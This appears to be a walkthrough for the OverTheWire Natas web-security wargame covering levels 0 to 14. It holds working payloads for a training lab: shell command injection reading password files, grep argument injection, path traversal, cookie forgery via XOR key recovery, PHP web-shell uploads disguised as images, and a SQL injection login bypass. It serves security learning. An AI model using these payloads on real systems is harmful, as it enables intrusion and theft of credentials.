# natas

Walkthrough [Natas](http://overthewire.org/wargames/natas/).

I recommend you do these yourself. If you are stuck, feel free to snoop around
this file. However, to keep the game spirit, the passwords are in the
`00_passwords.txt` file. **Don't go through that file unless you want to jump to
any given level.**

## natas0

right click, inspect, the password is in an html comment

## natas1

either open the page with the console already open or use a keyboard shortcut.

the password is still an html comment.

## natas2

inspecting the html reveals the existence of a `files` directory. If you go
`/files`, you will find a `users.txt` file with the `natas3` password in plain
text.

## natas3

inspecting the html, you will find a comment saying that not even google will
find the file this time. this is a hint to open the `/robots.txt` file.

opening it reveals that a `/s3cr3t` directory exists, which we can access and
see that a `users.txt` file exists. it contains our password.

## natas4

the page has a text saying you have arrived from a previous page. the only page
allowed is natas5. this is the referer header.

if you go to `natas5.natas.labs.overthewire.org`, click "cancel" when prompted
for password, then change the url to `natas4`, it should still not allow you
because changing the url does not set the http referer header.

there are two ways to do this: manually setting the header in the http request
and playing around with javascript to do that for us.

the first you can achieve by running this in your terminal:

```bash
# don't forget to replace $NATAS4_PASSWORD with the password you got
# from the previous step
curl --referer http://natas5.natas.labs.overthewire.org/ \
  natas4:$NATAS4_PASSWORD@natas4.natas.labs.overthewire.org
```

the response will contain the password

the second you can achieve by doing the following:

1. go to `natas5.natas.labs.overthewire.org`
2. click "cancel" when prompted for password
3. open the browser console
4. type `location.href = "http://natas4.natas.labs.overthewire.org"`

this will change the location of the page and the browser will set the correct
http header. the natas4 page should now display the password.

i used the second method because i was lazy. when i came back to do this write
up, i did the first method.

## natas5

apparently we are not logged in. opening the console allows us to see the cookie (just type `document.cookie`).

if we set it to `loggedin=1` and refresh (`document.cookie = "loggedin=1"`), it
should give us the password.

## natas6

if you click "view source" you can find that the php code is comparing against a
value obtain from a `/includes/secret.inc` file.

by putting that into the address bar, we can find the secret. now we just need
to go back input that secret into the form. it will spit out the password.

## natas7

by checking the html, there is a comment saying the password is in
`/etc/natas_webpass/natas8`. if we try to access that page through the browser
it will error because we don't have access to it.

however, going back and clicking the 'home' and 'about' links in the main page
we can notice they don't redirect. instead they use php to fetch the contents of
the page html document.

we can instead use that by changing the `page` url parameter to
`/etc/natas_webpass/natas8`.

## natas8

clicking "view source" we can see that we now have an encoded secret and the
script encodes the input value to compare with the encoded secret.

we can just reverse the encoded secret by typing into a php interpreter:

```php
// don't forget to replace $encoded_secret by the actual encoded secret string
echo base64_decode(strrev(hex2bin($encoded_secret)));
```

then it's just a matter of pasting the result into the input in the natas8 page
and getting the password.

## natas9

by clicking "view source code", we can see that the php script is running grep
and we can inject shell code into this. to try it:

```bash
"" ls; #
```

it will output the files in the current directory. going back to natas7, we get
the idea of checking the contents of `/etc/natas_webpass/natas10`:

```bash
""; cat /etc/natas_webpass/natas10 #
```

and we will have access to the password.

## natas10

looking through the source code of the php script, we can now see that it will
not allow certain characters. to get around this, we will just play around with
grep options and search for anything in a set of files. input this into the form

```bash
-e ".*" /etc/natas_webpass/natas11 #
```

this will search for any set of characters in the `/etc/natas_webpass/natas11`
file and ignore the rest of the command.

the password will be there in plaintext.

## natas11

inspecting the source code of the php script, we can see that it encrypts the
cookie. to encrypt it, it encodes a php array into json, xor's with a secret key
that we don't have access to and then encodes it into base64.

the cookie has a `showpassword` value that we need to change. the challenge here
is to get the key that allows us to reencrypt the cookie with the intented
values.

xor has an interesting property: xor'ing something twice with the same key will
yield the original value. or, in math terms, `^` being the xor operation:

```
a ^ b ^ a = b
```

in our php script we then have the following:

```bash
# defaultData is array("showpassword"=>"no", "bgcolor"=>"#ffffff")
# BE is the base64_encode function
# X is the xor_encrypt function
# J is the json_encode function
# BD is the base64_decode function
# K is the encryption key
# ^ is the xor operation
# . is the function composition operator

cookie = BE . X . J(defaultData)

# given that json = J(defaultData)
cookie = BE . X . json
cookie = BE . X(json)

# we know that X(json) is the xor operation with the K key, so:
cookie = BE . (K ^ json)

# we know that the opposite of BE is BD, so we can do the following:
BD(cookie) = K ^ json

# decoding the base64 of the cookie yields a binary, so let's call it bin_cookie
bin_cookie = K ^ json

# given the property that a ^ b ^ a = b, we conclude that:
K = bin_cookie ^ json
```

so in reality to get the key we need to get `bin_cookie` and `json`.

```php
$cookie = "a cookie"; // get the cookie by running document.cookie in the JS console
$defaultData = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$json = json_encode($defaultData);
$bin_cookie = base64_decode($cookie);
```

having all the elements for the decode, we can now get the key by doing
`bin_cookie ^ json`


```php
// this is the xor_encrypt function modified to accept a key as an argument
// instead of having it hardcoded
function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$key = xor_encrypt($json, $bin_cookie);

echo $key;
```

now you will notice the key has a pattern. something like `abcdabcdabcdabcd`.
you may be tempted to assume this is the key but it isn't so. notice that the
`xor_encrypt` function is designed to work with a message with of an arbitrary
size. which means that the message to encrypt (`$in`) might be larger than the
key.

the function then repeats the key once it reaches the end. e.g:

```bash
# before encryption starts
123456 ^ abc

# step 1
123456 ^ abc
^        ^

# step 2
123456 ^ abc
 ^        ^

# step 3
123456 ^ abc
  ^        ^

# once the xor'ing gets to 4, the code repeats the key
# step 4
123456 ^ abc
   ^     ^
```

it achieves that by doing `$outText .= $text[$i] ^ $key[$i % strlen($key)];`

the key part is the `$i % strlen($key)` bit.

as a consequence you will get a large output but the key will actually be
smaller. if the output is `abcdabcdabcdab`, the key is `abcd`.

having the key, you can now set your own cookie.

```php
$key = 'the key you got';
$targetData = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");

// this uses the different xor_encrypt function defined above
$hackedCookie = base64_encode(xor_encrypt(json_encode($targetData), $key));
echo $hackedCookie;
```

and you will get the changed cookie.

so now you just need to do `document.cookie = "data=your-cookie"` and refresh.

the password will be yours to take.

## natas12

looking at the php source, we can see that it uploads the image but doesn't do
any security checks.

upload a `hack.php` file with the following contents:

```php
<?php system("cat /etc/natas_webpass/natas13") ?>
```

you'll then be able to open the newly uploaded file and notice that it is being
interpreted at an image. at this point you would expect the browser to interpret
it as a php script.

when you inspect the form you will see that the filename has been pre-computed.
we can change the name from `something.jpg` to `something.php` and re-upload
`hack.php`. when we open the uploaded file the password will be available in
plaintext.

## natas13

this is pretty much similar to the previous one but the source code now reveals
the site is doing filetype checks. if we try to upload the previous file, it
will not work. we need to upload an image with embedded code.

download a 1px image, open it in an editor and append the following to it:

```php
<?php system("cat /etc/natas_webpass/natas14") ?>
```

change the file extension in the form to `.php` so the browser interprets as php
and finally upload the image. when you open the uploaded file, the password will
be yours to take.

## natas14

this is a simple sql injection hack. if you look at the source code, you'll see
that the sql string is build from the username and password request params
without any type of scrubbing.

you can enter the following as the username: `natas15" #` (i would expect that
`natas15" --` would work as well but apparently no). it doesn't matter what you
input for password.

the password for the next level should then be yours.
